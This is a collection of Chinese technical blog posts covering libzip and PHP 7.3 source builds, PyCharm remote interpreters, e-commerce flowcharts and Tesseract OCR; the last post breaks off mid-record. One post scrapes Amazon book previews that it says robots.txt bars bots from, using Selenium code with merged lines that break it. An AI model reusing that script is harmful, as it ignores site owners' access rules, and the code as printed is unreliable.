{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Libzip 版本过低或提示reinstall解决方法", "log_Intro": "Libzip 版本过低或提示reinstall解决方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>一、先删除libzip</h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>yum remove libzip -y</code></pre>\n\n<p> </p>\n\n<p>SSH执行以上命令，先删除libzip  和   libzip-devel</p>\n\n<p> </p>\n\n<h3>二、下载安装并手动编译</h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>wget https://nih.at/libzip/libzip-1.2.0.tar.gz\ntar -zxvf libzip-1.2.0.tar.gz\ncd libzip-1.2.0\n./configure\nmake &amp;&amp; make install</code></pre>\n\n<p> </p>\n\n<h3>三、（可忽略）另外最新版本请参考官网：https://nih.at/libzip/ 1.5.0的libzip需要cmake</h3>\n\n<pre class=\"has\">\n<code>\nwget https://libzip.org/download/libzip-1.5.0.tar.gz\ntar -zxvf libzip-*\ncd libzip*\nmkdir build &amp;&amp; cd build &amp;&amp; cmake .. &amp;&amp; make &amp;&amp; make install</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891258, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "电商订单逻辑流程图", "log_Intro": "电商订单逻辑流程图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><span style=\"font-size:18px;\">1.生成订单</span></strong></p><p><strong><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/20180512210533212\" alt=\"\"><br></span></strong></p><p><strong><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/20180512210553765\" alt=\"\"><br></span></strong></p><p><strong><span style=\"font-size:18px;\">2.用户确认订单</span></strong></p><p><strong><span style=\"font-size:18px;\"><img src=\"https://img-blog.csdn.net/20180512210747243\" alt=\"\"><br></span></strong></p>                                    </div>", "log_PostTime": 1584891258, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "电商系统购物车流程图", "log_Intro": "电商系统购物车流程图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <div><strong><span style=\"font-size:18px;\">1.用户添加购物车的逻辑流程图</span></strong></div><p></p><p><img src=\"https://img-blog.csdn.net/20180512175210633\" alt=\"\"></p><p><br></p><p><span style=\"font-size:18px;\"><strong><span>2.用户打开购物车的逻辑流程图</span></strong></span></p><p><img src=\"https://img-blog.csdn.net/20180512175801489\" alt=\"\"><br></p><p><img src=\"https://img-blog.csdn.net/20180512175822678\" alt=\"\"><br></p>                                    </div>", "log_PostTime": 1584891260, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PyCharm 配置远程python解释器和在本地修改服务器代码", "log_Intro": "PyCharm 配置远程python解释器和在本地修改服务器代码", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"使用场景\">使用场景</h2>\n\n<p>先说说自己的使用场景，我是在什么情况下，需要将IDE配置成这样的环境来方便我的工作。</p>\n\n<p>首先，我需要在本地机子上写python代码，但是因为是机器学习相关的一些代码，有时候本机跑可能会很慢，或者根本跑不下来。而此时，我还有一台可用的服务器，上面配置了相应的python3环境和相应的机器学习库，比如tensorflow，keras，tflearn等等。因此通常需要将本地写好的代码上传到服务器上，在服务器上运行。由于代码能力渣渣，所以常常需要反复修改代码，而直接在服务器上修改代码不是很方便。因此，我希望可以像下面一样操作：</p>\n\n<ol><li>我在服务器上有一个工作目录，我希望可以直接在我本地机子上修改工作目录下面的代码文件</li>\n\t<li>因为Pycharm可以配置远程python解释器，所以我希望可以直接在本地的机子上运行修改的代码，并且直接在本地机子查看运行的结果，而不用ssh到远程服务器在执行代码。</li>\n\t<li>具体来说就是，我可以直接在本地上编写代码，然后直接点击pycharm的绿色小三角执行代码，并且这个执行是由远程服务器的python解释器执行的，而不是在我本地机子上配置的python环境下执行。</li>\n</ol><h2 id=\"配置过程\">配置过程</h2>\n\n<h3 id=\"本机环境\">本机环境</h3>\n\n<p>操作系统：win10</p>\n\n<p>IDE：Pycharm</p>\n\n<h3 id=\"远程服务器\">远程服务器</h3>\n\n<p>操作系统：ubuntu14.04</p>\n\n<p>配置了ssh，可以使用ssh进行远程登陆</p>\n\n<h3 id=\"配置deployment\">配置Deployment</h3>\n\n<p>首先，在pycharm的菜单栏依次找到:Tools &gt; Deployment &gt; Configuration.</p>\n\n<p><img alt=\"通过菜单栏打开Deployment设置页面\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxMzQ5Mzk3MzQtODA5NTE1MDA1LnBuZw\"></p>\n\n<p>然后可以看到如下的配置页面，具体各配置在图片中说明:</p>\n\n<p><img alt=\"配置Deployment的Connection\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDE1MDQzNTktMTM2MTY3NzcxOS5wbmc\"></p>\n\n<p>然后打开Deployment的Mapping选项卡：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDUxMzU4MTItMjMwMzE1Mzc5LmpwZw\"></p>\n\n<p>这样，Deployment的配置就完成了。这个配置完成了之后，其实是相当于配置了一个ftp工具可以连接到服务器上，从而可以查看和修改服务器上的文件。你可以通过Tools &gt; Deplotment &gt; Browse Remote Host来打开相应的RemoteHost面板，这个面板显示的就是服务器上的文件，显示的范围是你在Deployment中的Connection选项卡下配置的Root path路径下的文件及文件夹。</p>\n\n<p><img alt=\"代开RemoteHost面板\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDE4NDA2ODctMTU4ODk2NDI2NS5wbmc\"></p>\n\n<p>你可以直接在RemoteHost面板里双击某个文件并且直接进行编辑。双击某个文件后你可以看到编辑区域的顶部有一个横条，并且横条的右边有三各按钮，分别是比较，撤销和上传操作。你在这里面编辑文件之后，可以直接点击上传按钮，就会提交到服务器了。但是其实不推荐直接在这里修改代码，后面的使用流程会说到。</p>\n\n<p><img alt=\"直接编辑RemoteHost里的文件\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDIwMjM4MTItMTM5NzI5NjI4OS5wbmc\"></p>\n\n<p>以上的配置，就可以直接在PyCharm里看到服务器上的文件，我感觉就像是直接在IDE里集成了一个FTP传输工具。</p>\n\n<h3 id=\"配置远程python解释器\">配置远程python解释器</h3>\n\n<p>这里主要讲的是如何配置远程python解释器。</p>\n\n<p>首先，通过File &gt; Settings,打开设置选项卡。</p>\n\n<p>在设置选项卡里，点击\"Project:项目名\"这个按钮，在展开的小项里再点击Project Interpreter，右边就会变成Interpreter的配置页面。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDIxMzQ3NjUtMjA4NzU4NjIxMC5wbmc\"></p>\n\n<p>点击Interpreter配置页面的小此轮按钮，然后再选择add Remote。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDIyMjI0NTItODE4Nzk2NDkucG5n\"></p>\n\n<p>弹出如下弹窗并配置相应的信息。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDIzMzAwMTUtMjAzOTM0Mjg0Mi5wbmc\"></p>\n\n<p>经过以上步骤，你的远程解释器就配置好了。这时，你就可以直接点击小三角按钮，调用远程服务器上的python解释器来运行代码。但是在此，你还需要看看下面的使用流程。如果你直接双击RemoteHost面板里的文件，然后点击小三角运行是会报错的，可能会提示：</p>\n\n<pre class=\"has\">\n<code>No such file or directory</code></pre>\n\n<h2 id=\"使用流程\">使用流程</h2>\n\n<p>在配置中也参考了很多其他文章，但是有些文章还是没有讲清楚具体的流程，因此我把自己认为可能“正确”的流程记录一下。</p>\n\n<p>在介绍Deployment配置的时候，我们讲到了Mapping选项卡的配置。这个配置将本地的一个路径映射成了服务器上的一个路径，因此，在这个文件夹下的文件和服务器上的文件是同步的，当然，需要你在本地修改的时候upload到服务器或者设置自动upload。</p>\n\n<p>在这里，我的mapping配置如下：</p>\n\n<table><thead><tr><th>local path</th>\n\t\t\t<th>Deployment path on server</th>\n\t\t</tr></thead><tbody><tr><td>E:\\workspace\\remotespace</td>\n\t\t\t<td>xxxx/workspacexhh</td>\n\t\t</tr></tbody></table><p>首先，我们在pycharm中通过 File &gt; open... 来打开一个新的项目，项目路径就选择上面的local path路径。</p>\n\n<p>在Project窗口中就可以看到打开了这个项目，当前这个项目还是空的，里面什么也没有。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDI4MDE5OTktMzI3NTIwNjI3LnBuZw\"></p>\n\n<p>然后，我们打开RemoteHost小窗口，在test.py文件上右键，再选择Download from Here,文件就会下载到本地了。返回到Project小窗口，就可以看到test.py。其他的文件类似，如果有父目录，他会将父目录也一起下载下来，所以文件和路径都会和服务器保持一致。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDI5MTg1NzctMjc1MDUxMDA0LnBuZw\"></p>\n\n<p>这样，你就可以在本地编辑test.py文件。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDI5NDIxMjQtNjg1MTg4OTAucG5n\"></p>\n\n<p>在编辑完成后，你可以在文件上右键或者直接在编辑区域右键，选择upload to... 将文件上传到服务器，这样就可以更新服务器端的代码了，并且保持了和本地代码一致。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDMwMjMzMjctNjM0MTQ2NDk4LnBuZw\"></p>\n\n<p>此时，点击绿色小三角运行代码，可以看到相应的输出。但是看看控制台的输出，可以发现，python解释器不是本地的，而跑的文件也不是本地。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvNzk4OTQ4LzIwMTcxMS83OTg5NDgtMjAxNzExMTgxNDMwNTY5MzctNzU3NzU2MzY0LnBuZw\"></p>\n\n<p>上面就是整个从服务器下载文件至本地，在本地修改文件，将文件上传至服务器，然后直接在本地运行的整个过程。</p>\n\n<p>在这个过程中，也可以发现，经过这样的配置，我们的代码现在一共有三个版本：一个是本地代码，一个是服务器上的代码，还有一个是RemoteHost面板中的代码(这个地方的代码如果直接编辑了，其实也可以提交到服务器，但是不能直接运行)</p>\n\n<p>所以，如果通过上面的配置进行远程调试的话，我认为大致流程应该是下面这样：</p>\n\n<ol><li>在RemoteHost面板中，选中想要修改的代码，然后右键点击Download from here将内容下载至本地(这个本地是你在配置Deployment时设置的本地文件夹)。</li>\n\t<li>在本地(这个本地是你在配置Deployment时设置的本地文件夹)修改你的代码，修改完成后在编辑区域或者文件名上右键，选择upload to...来提交到服务器。</li>\n\t<li>在提交之后，你可以像普通调用本地解释器一样的直接运行本地的这个文件(但其实运行的是服务器的文件)</li>\n</ol><p>在这里，虽然RemoteHost里的文件可以直接编辑，但是并不建议这么做，因为这里编辑之后并不能直接运行。</p>\n                                    </div>", "log_PostTime": 1584891261, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：处理一些格式规范的文字", "log_Intro": "Python：处理一些格式规范的文字", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>你要处理的大多数文字都是比较干净、格式规范的。格式规范的文字通常可以满足一些需求,不过究竟什么是“格式混乱”,什么算“格式规范”,确实因人而异。 通常,格式规范的文字具有以下特点:</p>\n\n<ul><li>使用一个标准字体(不包含手写体、草书,或者十分“花哨的”字体) • 虽然被复印或拍照,字体还是很清晰,没有多余的痕迹或污点</li>\n\t<li>排列整齐,没有歪歪斜斜的字</li>\n\t<li>没有超出图片范围,也没有残缺不全,或紧紧贴在图片的边缘</li>\n</ul><p>文字的一些格式问题在图片预处理时可以进行解决。例如,可以把图片转换成灰度图,调 整亮度和对比度,还可以根据需要进行裁剪和旋转（详情请关注图像与信号处理），但是,这些做法在进行更具扩展性的 训练时会遇到一些限制。</p>\n\n<h3 id=\"格式规范文字的理想示例\">格式规范文字的理想示例</h3>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019103015454326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>通过下面的命令运行 Tesseract，读取文件并把结果写到一个文本文件中: `tesseract test.jpg text</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191030154555407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p><code>cat text.txt</code> 即可显示结果。</p>\n\n<p>识别结果很准确,不过符号<code>^</code>和<code>*</code>分别被表示成了双引号和单引号。大体上可以让你很舒服地阅读。</p>\n\n<h3 id=\"通过python代码实现\">通过Python代码实现</h3>\n\n<pre class=\"has\">\n<code class=\"language-python\">import pytesseract\nfrom PIL import Image\n\nimage = Image.open('test.jpg')\ntext = pytesseract.image_to_string(image)\nprint text\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>This is some text, written in Arial, that will be read by\nTesseract. Here are some symbols: !@#$%\"&amp;*()\n</code></pre>\n\n<h3 id=\"对图片进行阈值过滤和降噪处理（了解即可）\">对图片进行阈值过滤和降噪处理（了解即可）</h3>\n\n<p>很多时候我们在网上会看到这样的图片：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191030154609125.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>Tesseract 不能完整处理这个图片,主要是因为图片背景色是渐变的,最终结果是这样:</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019103015462489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>随着背景色从左到右不断加深,文字变得越来越难以识别,Tesseract 识别出的 每一行的最后几个字符都是错的。</p>\n\n<p>遇到这类问题,可以先用 Python 脚本对图片进行清理。利用 Pillow 库,我们可以创建一个 阈值过滤器来去掉渐变的背景色,只把文字留下来,从而让图片更加清晰,便于 Tesseract 读取:</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">from PIL import Image \nimport subprocess\n\ndef cleanFile(filePath, newFilePath): \n    image = Image.open(filePath)\n\n    # 对图片进行阈值过滤,然后保存\n    image = image.point(lambda x: 0 if x&lt;143 else 255)     \n    image.save(newFilePath)\n\n    # 调用系统的tesseract命令对图片进行OCR识别     \n    subprocess.call([\"tesseract\", newFilePath, \"output\"])\n\n    # 打开文件读取结果\n    file = open(\"output.txt\", 'r')     \n    print(file.read()) \n    file.close()\n\ncleanFile(\"text2.jpg\", \"text2clean.png\")\n</code></pre>\n\n<p>通过一个阈值对前面的“模糊”图片进行过滤的结果</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191030154640973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>除了一些标点符号不太清晰或丢失了,大部分文字都被读出来了。Tesseract 给出了最好的 结果:</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191030154654155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<h2 id=\"从网站图片中抓取文字\">从网站图片中抓取文字</h2>\n\n<p>用 Tesseract 读取硬盘里图片上的文字,可能不怎么令人兴奋,但当我们把它和网络爬虫组合使用时,就能成为一个强大的工具。</p>\n\n<p>网站上的图片可能并不是故意把文字做得很花哨 (就像餐馆菜单的 JPG 图片上的艺术字),但它们上面的文字对网络爬虫来说就是隐藏起来 了，举个例子：</p>\n\n<ul><li>\n\t<p>虽然亚马逊的 robots.txt 文件允许抓取网站的产品页面,但是图书的预览页通常不让网络机 器人采集。</p>\n\t</li>\n\t<li>\n\t<p>图书的预览页是通过用户触发 Ajax 脚本进行加载的,预览图片隐藏在 div 节点 下面;其实,普通的访问者会觉得它们看起来更像是一个 Flash 动画,而不是一个图片文 件。当然,即使我们能获得图片,要把它们读成文字也没那么简单。</p>\n\t</li>\n\t<li>\n\t<p>下面的程序就解决了这个问题:首先导航到托尔斯泰的《战争与和平》的大字号印刷版 1, 打开阅读器,收集图片的 URL 链接,然后下载图片,识别图片,最后打印每个图片的文 字。因为这个程序很复杂,利用了前面几章的多个程序片段,所以我增加了一些注释以让 每段代码的目的更加清晰:</p>\n\t</li>\n</ul><pre class=\"has\">\n<code class=\"language-python\">\nimport time\nfrom urllib.request import urlretrieve \nimport subprocess\nfrom selenium import webdriver\n#创建新的Selenium driver\ndriver = webdriver.PhantomJS()\n\n# 用Selenium试试Firefox浏览器:\n# driver = webdriver.Firefox()\n\ndriver.get(\"http://www.amazon.com/War-Peace-Leo-Nikolayevich-Tolstoy/dp/1427030200\")\n# 单击图书预览按钮 driver.find_element_by_id(\"sitbLogoImg\").click() imageList = set()\n# 等待页面加载完成\ntime.sleep(5)\n# 当向右箭头可以点击时,开始翻页\nwhile \"pointer\" in driver.find_element_by_id(\"sitbReaderRightPageTurner\").get_attribute(\"style\"):\n    driver.find_element_by_id(\"sitbReaderRightPageTurner\").click()\n    time.sleep(2)\n    # 获取已加载的新页面(一次可以加载多个页面,但是重复的页面不能加载到集合中) \n    pages = driver.find_elements_by_xpath(\"//div[@class='pageImage']/div/img\") \n    for page in pages:\n        image = page.get_attribute(\"src\")\n        imageList.add(image)\ndriver.quit()\n\n# 用Tesseract处理我们收集的图片URL链接 \nfor image in sorted(imageList):\n    # 保存图片\n    urlretrieve(image, \"page.jpg\")\n    p = subprocess.Popen([\"tesseract\", \"page.jpg\", \"page\"], stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    f = open(\"page.txt\", \"r\")\n    p.wait() print(f.read())\n</code></pre>\n\n<p>和我们前面使用 Tesseract 读取的效果一样,这个程序也会完美地打印书中很多长长的段 落,第六页的预览如下所示:</p>\n\n<pre class=\"has\">\n<code>6\n     \"A word of friendly advice, mon\n     cher. Be off as soon as you can,\n     that's all I have to tell you. Happy\n     he who has ears to hear. Good-by,\n     my dear fellow. Oh, by the by!\" he\n     shouted through the doorway after\n     Pierre, \"is it true that the countess\n     has fallen into the clutches of the\n     holy fathers of the Society of je-\n     sus?\"\n\n     Pierre did not answer and left Ros-\n     topchin's room more sullen and an-\n     gry than he had ever before shown\n     himself.\n</code></pre>\n\n<p>但是,当文字出现在彩色封面上时,结果就不那么完美了:</p>\n\n<pre class=\"has\">\n<code>   WEI' nrrd Peace\n   Len Nlkelayevldu Iolfluy\n   Readmg shmdd be ax\n   wlnvame asnossxble Wenfler\n   an mm m our cram: Llhvary\n    - Leo Tmsloy was a Russian rwovelwst\n    I and moval phflmopher med lur\n    A ms Ideas 01 nonviolenx reswslance m 5 We range     0, \"and\"\n</code></pre>\n\n<p>如果想把文字加工成普通人可以看懂的 效果,还需要花很多时间去处理。</p>\n\n<p>下一节将介绍另一种方法来解决文字混乱的问题,尤其是当你愿意花一点儿时间训练 Tesseract 的时候。</p>\n\n<p>通过给 Tesseract 提供大量已知的文字与图片映射集,经过训练 Tesseract 就可以“学会”识别同一种字体,而且可以达到极高的精确率和准确率,甚至可以忽略图 片中文字的背景色和相对位置等问题。</p>\n                                    </div>", "log_PostTime": 1584891262, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7 php7.0 升级到php7.3", "log_Intro": "CentOS7 php7.0 升级到php7.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <blockquote>\n<p>不要问我为什么要升级，我不是运维。如果你也不是运维的话，而且是公司的服务器的话，那你还是要慎重啊，我他么的就这样填了一天的坑，简单记录一下这坑爹的一天</p>\n</blockquote>\n\n<h2 id=\"item-1\">备份之前的php7.0(这很重要，非常重要)</h2>\n\n<blockquote>\n<p>如果这一步没有做的话，直接升级，我敢确定90% 你服务器就挂了，至于为什么呢，因为你之前的配置都没有了呗，而新安装的php7.3 配置是新的，没有了各种扩展，你服务器怎么跑起来。当然如果你什么扩展都没有安装，恭喜你，你可以不用备份</p>\n</blockquote>\n\n<pre class=\"has\">\n<code>cp -P /usr/local/php /usr/local/php70</code></pre>\n\n<h2 id=\"item-2\">查看php7.0的configure</h2>\n\n<blockquote>\n<p>既然是升级，当然<code>configure</code>只能比以前多而不能少了，如果你忘记了以前的<code>configure</code>(肯定没人记得)，查看phpinfo</p>\n</blockquote>\n\n<pre class=\"has\">\n<code>php -i | grep configure</code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"166\" src=\"https://img-blog.csdnimg.cn/20191229123317293.png\" width=\"765\"></p>\n\n<p>替换一下就可以获得之前的<code>configure</code> 命令</p>\n\n<pre class=\"has\">\n<code>php -i | grep configure | sed -e \"s/Configure Command =&gt; //; s/'//g\"</code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"144\" src=\"https://img-blog.csdnimg.cn/2019122912333510.png\" width=\"762\"></p>\n\n<p><strong>注意:php7.3不支持 --with-mcrypt, --enable-gd-native-ttf，把这两个选项删除掉。</strong> </p>\n\n<p>编译zlib时提示：configure: error: Please reinstall the libzip distributio 或者 configure: error: system libzip must be upgraded to version &gt;= 0.11<br>\n使用Yum最新版只到0.10，不足以达到要求</p>\n\n<p>可升级libzip：<a href=\"https://blog.csdn.net/xiaoweite1/article/details/103751276\">点击教程</a></p>\n\n<h2 id=\"item-3\">下载php7.3源码</h2>\n\n<pre class=\"has\">\n<code>cd /usr/local/src\nwget -c https://www.php.net/distributions/php-7.3.13.tar.gz -O php-7.3.13.tar.gz\n\ntar -zxvf php-7.3.13.tar.gz\ncd php-7.3.13/\n</code></pre>\n\n<h2 id=\"item-4\">开始安装7.3</h2>\n\n<pre class=\"has\">\n<code>cd php-7.3.13\n\n./configure  --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-config-file-scan-dir=/usr/local/php/conf.d --enable-fpm --with-fpm-user=www --with-fpm-group=www --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-iconv-dir --with-freetype-dir=/usr/local/freetype --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --enable-mbregex --enable-mbstring --enable-intl --enable-ftp --with-gd --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --with-gettext --disable-fileinfo --enable-opcache --with-xsl\n\nmake \n\nmake install\n</code></pre>\n\n<p>这样基本就安装完成了，简单吧，是很简单，但是坑来了</p>\n\n<p>过程中可能出现：make: *** [sapi/cli/php] Error 1</p>\n\n<p>解决方法：make ZEND_EXTRA_LIBS='-liconv'</p>\n\n<h2 id=\"item-5\">开始填坑</h2>\n\n<p>既然是升级，配置当然和以前一样就好了</p>\n\n<pre class=\"has\">\n<code>cp /usr/local/php70/etc/php.ini /usr/local/php/etc/php.ini\ncp /usr/local/php70/etc/php-fpm.conf /usr/local/php/etc/php-fpm.conf\ncp /usr/local/php70/etc/php-fpm.d/www.conf /usr/local/php/etc/php-fpm.d/www.conf</code></pre>\n\n<p>扩展的坑，以前装了什么扩展，现在都要重新安装了，而且<strong><code>不能在以前的扩展包文件夹下安装，必须是新的扩展包文件夹</code></strong>,这很重要，不然你一直执行<code>php -v</code> 都有类似下面的问题</p>\n\n<pre class=\"has\">\n<code>PHP Warning: PHP Startup: Unable to load dynamic library'/usr/local/php7/lib/php/extensions/no-debug-non-zts-20160303/memcached.so' - /usr/local/php7/lib/php/extensions/no-debug-non-zts-20160303/memcached.so: cannot open sharedobject file: No such file or directory in Unknown on line 0</code></pre>\n\n<p>如果忘记安装了什么扩展，看一下扩展目录有什么就行了：</p>\n\n<pre class=\"has\">\n<code>[root]$ /usr/local/php/bin/php-config --extension-dir\n /usr/local/php7/lib/php/extensions/no-debug-non-zts-20160303\n[root]$  ls /usr/local/php7/lib/php/extensions/no-debug-non-zts-20160303\n </code></pre>\n\n<p>其中<code>opcache.a opcache.so</code> 是自带的，其他的都是新增的。其他扩展怎么装，就不告诉你了，如果你其他扩展装的很多的话，那恭喜你，你又可以好好练一遍了</p>\n\n<h2 id=\"item-6\">重新启动php-fpm</h2>\n\n<pre class=\"has\">\n<code>systemctl restart php-fpm</code></pre>\n\n<p>查看状态</p>\n\n<pre class=\"has\">\n<code>systemctl status php-fpm -l</code></pre>\n\n<h2 id=\"item-7\">剩下的坑，代码的坑</h2>\n\n<p>这个就有点丢脸了，如果你代码写的不怎么严谨的话，估计<code>error.log</code> 现在已经很大了，剩下很长一段时间你的又要修自己的代码了。我为什么把这个拿出来说呢，主要是我他么一天都在改这个兼容代码?(代码写的太烂)。比如单例一个类就爆出一个巨坑。。。。。祝你们好运</p>\n                                    </div>", "log_PostTime": 1584891263, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP7.3中fileinfo怎么安装与开启", "log_Intro": "PHP7.3中fileinfo怎么安装与开启", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>摘要：</strong>安装lumen时创建项目时报错，需开启fileinfo</p>\n\n<p>操作方法如下：</p>\n\n<pre class=\"has\">\n<code>cd /usr/local/src/php-7.3.13/ext/fileinfo\n\n/usr/local/php/bin/phpize</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191229220243240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p><strong>编译安装</strong></p>\n\n<pre class=\"has\">\n<code>./configure --with-php-config=/usr/local/php/bin/php-config\n make &amp;&amp; make install</code></pre>\n\n<p><br><br><strong>完成后提示：</strong></p>\n\n<p>Build complete.<br>\nDon't forget to run 'make test'.</p>\n\n<p>Installing shared extensions:     /usr/local/php/lib/php/extensions/no-debug-non-zts-20180731/<br><br>\n这里就是你的扩展目录了，然后去看一个有没有一个叫做fileinfo.so的扩展。</p>\n\n<pre class=\"has\">\n<code>cd /usr/local/php/lib/php/extensions/no-debug-non-zts-20180731/</code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"138\" src=\"https://img-blog.csdnimg.cn/20191229220954159.png\" width=\"711\"></p>\n\n<pre class=\"has\">\n<code>vim /usr/local/php/etc/php.ini</code></pre>\n\n<p><br>\n修改php.ini文件，添加extension=fileinfo.so</p>\n\n<p>extension=/usr/local/php/lib/php/extensions/no-debug-non-zts-20180731/fileinfo.so </p>\n                                    